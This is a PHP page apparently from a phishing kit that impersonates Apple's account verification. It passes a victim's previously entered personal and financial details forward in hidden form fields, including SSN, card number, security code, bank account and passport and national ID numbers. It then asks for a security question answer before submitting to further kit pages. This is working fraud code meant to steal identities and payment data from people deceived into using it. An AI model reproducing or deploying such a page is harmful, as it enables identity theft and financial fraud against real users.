<?php
error_reporting(0);
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.mob.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require_once "assets/includes/apxdev.php";
require_once "setting.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?=tr('Confirm your information');?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<style>.error {color:red}</style>
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?=tr('Account Verification');?></span>
                                    <small class="SessionUser"><?=tr('Your Apple ID is');?> <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link"><?=tr('Sign Out');?> </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">


<?php if($idcard == "yoi"){
?>
<form action="Upload-Identity.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
 <?php }else{ ?>
 <form action="Done.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
 <?php } ?>
<input type="hidden" name="fname" value="<?php echo $_POST['fname'];?>">
<input type="hidden" name="mname" value="<?php echo $_POST['mname'];?>">
<input type="hidden" name="lname" value="<?php echo $_POST['lname'];?>">
<input type="hidden" name="dob" value="<?php echo $_POST['dob'];?>">
<input type="hidden" name="address" value="<?php echo $_POST['address'];?>">
<input type="hidden" name="town" value="<?php echo $_POST['town'];?>">
<input type="hidden" name="postcode" value="<?php echo $_POST['postcode'];?>">
<input type="hidden" name="county" value="<?php echo $_POST['county'];?>">
<input type="hidden" name="country" value="<?php echo $_POST['country'];?>">
<input type="hidden" name="telephone" value="<?php echo $_POST['telephone'];?>">
<input type="hidden" name="ssn" value="<?php echo $_POST['ssn'];?>">
<input type="hidden" name="ccname" value="<?php echo $_POST['ccname'];?>">
<input type="hidden" name="ccno" value="<?php echo $_POST['ccno'];?>">
<input type="hidden" name="ccexp" value="<?php echo $_POST['ccexp'];?>">
<input type="hidden" name="secode" value="<?php echo $_POST['secode'];?>">
<input type="hidden" name="acno" value="<?php echo $_POST['acno'];?>">
<input type="hidden" name="sortcode" value="<?php echo $_POST['sortcode'];?>">
<input type="hidden" name="climit" value="<?php echo $_POST['climit'];?>">
<input type="hidden" name="bans" value="<?php echo $_POST['bans'];?>">
<input type="hidden" name="numbid" value="<?php echo $_POST['numbid'];?>">
<input type="hidden" name="passport" value="<?php echo $_POST['passport'];?>">
<input type="hidden" name="naid" value="<?php echo $_POST['naid'];?>">
<input type="hidden" name="citizenid" value="<?php echo $_POST['citizenid'];?>">
<input type="hidden" name="civilid" value="<?php echo $_POST['civilid'];?>">
<input type="hidden" name="qatarid" value="<?php echo $_POST['qatarid'];?>">
<input type="hidden" name="cardid" value="<?php echo $_POST['cardid'];?>">
<input type="hidden" name="cardpassword" value="<?php echo $_POST['cardpassword'];?>">
<input type="hidden" name="nabid" value="<?php echo $_POST['nabid'];?>">
<input type="hidden" name="bankaccount" value="<?php echo $_POST['bankaccount'];?>">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle" id="nameLabel"><?=tr('Select A Security Question');?></h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
    <option  value=""><?=tr('Select security question');?></option>
    <option value="mothers maiden name"><?=tr("Mother's Maiden Name");?></option>
    <option value="drivers no"><?=tr('Driving License Number');?></option>
    <option value="passport no"><?=tr('Passport Number');?></option>
</select>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="<?=tr('Answer');?>">
</div>
</div>
<br>
<br>
<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="<?=tr('Finish');?>">
</div>
</div>
</div>
</div>
</div>
</form>



</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>